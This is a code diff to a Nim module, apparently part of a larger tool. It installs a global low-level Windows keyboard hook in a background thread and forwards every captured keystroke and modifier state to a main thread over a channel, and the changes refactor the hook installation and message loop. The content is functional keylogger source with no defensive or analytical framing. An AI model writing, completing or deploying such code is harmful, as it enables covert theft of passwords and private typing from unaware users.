@@ -3,12 +3,13 @@ from tables import `[]`
 import winim
 import ../channels
 from ../constants import keys
+
 var eHook: HHOOK
 
 # var keylog: string = ""
 
 proc keyboardHandler(nCode: int32, wparam: WPARAM, lparam: LPARAM): LRESULT {.stdcall.} =
-  if (nCode == HC_ACTION):
+  if (nCode == 0):
 
     let kbs: PKBDLLHOOKSTRUCT = cast[ptr KBDLLHOOKSTRUCT](lparam)
     let key: DWORD = kbs.vkCode
@@ -16,14 +17,8 @@ proc keyboardHandler(nCode: int32, wparam: WPARAM, lparam: LPARAM): LRESULT {.st
 
     if wparam == WM_KEYDOWN or wparam == WM_SYSKEYDOWN:
       mainThread.send keyText
-      # keylog.add "sal cf" # Keys::KEYS[kbs->vkCode].Name;
 
-      if (kbs.vkCode == VK_RETURN):
-        # keylog.add '\n'
-        discard
-    elif wparam == WM_KEYUP or wparam == WM_SYSKEYUP: # if key state is
-    # released, used for
-    # sys keys like SHIFT
+    elif wparam == WM_KEYUP or wparam == WM_SYSKEYUP:
       if key == VK_CONTROL or key == VK_LCONTROL or key == VK_RCONTROL or
           key == VK_SHIFT or key == VK_RSHIFT or key == VK_LSHIFT or
           key == VK_MENU or key == VK_LMENU or key == VK_RMENU or
@@ -33,20 +28,13 @@ proc keyboardHandler(nCode: int32, wparam: WPARAM, lparam: LPARAM): LRESULT {.st
         KeyName.insert("/", 1) # insert like [SHIFT] [a] [b] [/SHIFT]
         mainThread.send KeyName
 
-  result = CallNextHookEx(eHook, nCode, wparam, lparam)
-
-proc install(): void =
-  let handle: HMODULE = GetModuleHandle(NULL)
-
-  eHook = SetWindowsHookEx(WH_KEYBOARD_LL, HOOKPROC keyboardHandler, handle, 0)
-
-  PostMessage(0, 0, 0, 0)
+  result = CallNextHookEx(0, nCode, wparam, lparam)
 
 proc initKeyloggerThread*(): void {.thread.} =
-  install()
+  eHook = SetWindowsHookEx(WH_KEYBOARD_LL, HOOKPROC keyboardHandler, 0, 0)
 
   var msg: MSG
 
+  ## getMessage loop, am nev de asta ca altfel nu ruleaza procul
   while GetMessage(addr msg, 0, 0, 0):
-    TranslateMessage(addr msg)
-    DispatchMessage(addr msg)
+    discard
